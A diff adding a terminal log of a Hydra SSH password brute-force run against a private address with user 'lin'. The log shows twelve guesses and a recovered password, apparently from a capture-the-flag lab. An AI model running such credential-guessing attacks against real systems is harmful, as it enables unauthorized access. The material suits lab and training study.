@@ -1,0 +1,21 @@
+root@ip-10-66-104-187:~# hydra -l lin -P locks.txt ssh://10.66.158.54 -t 4 -V -o scans/hydra.ssh.txt
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-21 14:10:53
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task
+[DATA] attacking ssh://10.66.158.54:22/
+[ATTEMPT] target 10.66.158.54 - login "lin" - pass "rEddrAGON" - 1 of 26 [child 0] (0/0)
+[ATTEMPT] target 10.66.158.54 - login "lin" - pass "ReDdr4g0nSynd!cat3" - 2 of 26 [child 1] (0/0)
+[ATTEMPT] target 10.66.158.54 - login "lin" - pass "Dr@gOn$yn9icat3" - 3 of 26 [child 2] (0/0)
+[ATTEMPT] target 10.66.158.54 - login "lin" - pass "R3DDr46ONSYndIC@Te" - 4 of 26 [child 3] (0/0)
+[ATTEMPT] target 10.66.158.54 - login "lin" - pass "ReddRA60N" - 5 of 26 [child 0] (0/0)
+[ATTEMPT] target 10.66.158.54 - login "lin" - pass "R3dDrag0nSynd1c4te" - 6 of 26 [child 1] (0/0)
+[ATTEMPT] target 10.66.158.54 - login "lin" - pass "dRa6oN5YNDiCATE" - 7 of 26 [child 3] (0/0)
+[ATTEMPT] target 10.66.158.54 - login "lin" - pass "ReDDR4g0n5ynDIc4te" - 8 of 26 [child 2] (0/0)
+[ATTEMPT] target 10.66.158.54 - login "lin" - pass "R3Dr4gOn2044" - 9 of 26 [child 0] (0/0)
+[ATTEMPT] target 10.66.158.54 - login "lin" - pass "RedDr4gonSynd1cat3" - 10 of 26 [child 1] (0/0)
+[ATTEMPT] target 10.66.158.54 - login "lin" - pass "R3dDRaG0Nsynd1c@T3" - 11 of 26 [child 3] (0/0)
+[ATTEMPT] target 10.66.158.54 - login "lin" - pass "Synd1c4teDr@g0n" - 12 of 26 [child 2] (0/0)
+[22][ssh] host: 10.66.158.54   login: lin   password: RedDr4gonSynd1cat3
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-21 14:11:01
